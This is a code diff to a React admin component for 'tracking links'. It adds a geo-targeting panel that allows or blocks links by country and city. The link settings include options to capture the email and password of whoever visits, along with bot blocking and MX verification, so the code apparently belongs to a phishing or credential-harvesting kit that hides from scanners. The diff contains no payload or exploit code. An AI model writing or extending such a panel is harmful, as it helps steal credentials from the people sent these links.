@@ -45,6 +45,7 @@ const TrackingLinks = () => {
     botsBlocked: 0,
     totalLinks: 0
   });
+  
   const [newLink, setNewLink] = useState({
     target_url: '',
     preview_template_url: '',
@@ -52,17 +53,17 @@ const TrackingLinks = () => {
     capture_email: false,
     capture_password: false,
     bot_blocking_enabled: true,
-    rate_limiting_enabled: false,
-    dynamic_signature_enabled: false,
-    mx_verification_enabled: false,
     geo_targeting_enabled: false,
-    geo_targeting_type: 'allow',
+    geo_targeting_type: 'allow', // 'allow' or 'block'
     allowed_countries: [],
     blocked_countries: [],
+    allowed_regions: [],
+    blocked_regions: [],
     allowed_cities: [],
     blocked_cities: [],
-    allowed_regions: [],
-    blocked_regions: []
+    rate_limiting_enabled: false,
+    dynamic_signature_enabled: false,
+    mx_verification_enabled: false
   });
 
   useEffect(() => {
@@ -253,8 +254,8 @@ const TrackingLinks = () => {
         </Button>
       </div>
 
-      {/* Analytics Cards - 4 compact cards in one row */}
-      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
+      {/* Analytics Cards - 4 cards in one horizontal row */}
+      <div className="grid grid-cols-4 gap-4">
         <Card className="border-l-4 border-l-blue-500">
           <CardContent className="p-4">
             <div className="flex items-center justify-between">
@@ -534,6 +535,82 @@ const TrackingLinks = () => {
                       />
                       <Label htmlFor="geo_targeting">Geo Targeting</Label>
                     </div>
+                  </div>
+
+                  {/* Enhanced Geolocation Fields - Only show when geo targeting is enabled */}
+                  {newLink.geo_targeting_enabled && (
+                    <div className="space-y-4 mt-4 p-4 border rounded-lg bg-gray-50">
+                      <div className="space-y-2">
+                        <Label htmlFor="geo_targeting_type">Targeting Type</Label>
+                        <Select
+                          value={newLink.geo_targeting_type}
+                          onValueChange={(value) => setNewLink(prev => ({ ...prev, geo_targeting_type: value }))}
+                        >
+                          <SelectTrigger>
+                            <SelectValue placeholder="Select targeting type" />
+                          </SelectTrigger>
+                          <SelectContent>
+                            <SelectItem value="allow">Allow Selected Locations</SelectItem>
+                            <SelectItem value="block">Block Selected Locations</SelectItem>
+                          </SelectContent>
+                        </Select>
+                      </div>
+
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div className="space-y-2">
+                          <Label htmlFor="countries">Countries</Label>
+                          <Textarea
+                            id="countries"
+                            placeholder="Enter countries (one per line)&#10;e.g. United States&#10;Canada&#10;United Kingdom"
+                            value={newLink.geo_targeting_type === 'allow' ? newLink.allowed_countries.join('\n') : newLink.blocked_countries.join('\n')}
+                            onChange={(e) => {
+                              const countries = e.target.value.split('\n').filter(c => c.trim());
+                              if (newLink.geo_targeting_type === 'allow') {
+                                setNewLink(prev => ({ ...prev, allowed_countries: countries }));
+                              } else {
+                                setNewLink(prev => ({ ...prev, blocked_countries: countries }));
+                              }
+                            }}
+                            rows={4}
+                          />
+                        </div>
+
+                        <div className="space-y-2">
+                          <Label htmlFor="regions">Cities/Regions</Label>
+                          <Textarea
+                            id="regions"
+                            placeholder="Enter cities or regions (one per line)&#10;e.g. New York&#10;California&#10;London"
+                            value={newLink.geo_targeting_type === 'allow' ? 
+                              [...newLink.allowed_regions, ...newLink.allowed_cities].join('\n') : 
+                              [...newLink.blocked_regions, ...newLink.blocked_cities].join('\n')
+                            }
+                            onChange={(e) => {
+                              const locations = e.target.value.split('\n').filter(l => l.trim());
+                              if (newLink.geo_targeting_type === 'allow') {
+                                setNewLink(prev => ({ 
+                                  ...prev, 
+                                  allowed_regions: locations,
+                                  allowed_cities: locations 
+                                }));
+                              } else {
+                                setNewLink(prev => ({ 
+                                  ...prev, 
+                                  blocked_regions: locations,
+                                  blocked_cities: locations 
+                                }));
+                              }
+                            }}
+                            rows={4}
+                          />
+                        </div>
+                      </div>
+                    </div>
+                  )}
+                </div>
+
+                <div className="space-y-4">
+                  <h3 className="text-lg font-semibold">Additional Options</h3>
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
 
                     <div className="flex items-center space-x-2">
                       <Switch
